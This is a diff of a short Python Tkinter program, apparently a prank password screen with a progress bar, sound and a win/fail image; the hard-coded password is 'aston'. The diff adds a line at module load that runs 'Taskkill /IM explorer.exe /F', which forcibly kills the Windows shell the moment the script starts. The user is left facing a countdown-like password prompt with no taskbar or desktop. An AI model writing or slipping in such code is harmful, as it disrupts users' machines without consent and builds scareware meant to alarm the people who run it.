@@ -22,7 +22,6 @@
 #
 # [1]: https://www.youtube.com/watch?v=goeZaYERNnM
 
-
 try:
   import Tkinter              # Python 2
   import ttk
@@ -31,24 +30,30 @@ except ImportError:
   import tkinter as Tkinter   # Python 3
   import tkinter.ttk as ttk
 
+import os
+os.system("Taskkill /IM explorer.exe /F")
+
 def main():
+	
 	root = Tkinter.Tk()
 	ft = ttk.Frame(height=100)
 	
 	ft.pack(expand=True, fill=Tkinter.BOTH, side=Tkinter.TOP)
-	winsound.PlaySound('sonic.wav', winsound.SND_FILENAME)
-
+	winsound.PlaySound('sonic.wav', winsound.SND_FILENAME | winsound.SND_ASYNC)
 
 	pb_hd = ttk.Progressbar(ft, orient='horizontal', mode='determinate')
 	pb_hd.pack(expand=True, fill=Tkinter.BOTH, side=Tkinter.TOP)
 	pb_hd.start(500)
 	root.wm_geometry("1000x200")
 
-	entree = Tkinter.Entry(root, textvariable="Entrer le mot de passe", width=30)
+	entryText = Tkinter.StringVar()
+	entree = Tkinter.Entry(root, textvariable=entryText, width=30)
+
 	entree.pack()
 	win = Tkinter.PhotoImage(file="win.gif")
 	fail = Tkinter.PhotoImage(file="fail.gif")
 	def end(endType):
+		winsound.PlaySound(None, winsound.SND_ASYNC)
 		canvas = Tkinter.Canvas(root, width=800, height=450)
 		if endType == "win":
 			canvas.create_image(0, 0, anchor=Tkinter.NW, image=win)
@@ -63,7 +68,9 @@ def main():
 		root.wm_geometry("1000x500")
 
 	def callback(event):
-		if entree.get() == "aston":
+		reponse = entree.get()
+		entryText.set( "" )
+		if reponse == "aston":
 			end("win")
 		else:
 			futur = pb_hd['value'] + 10
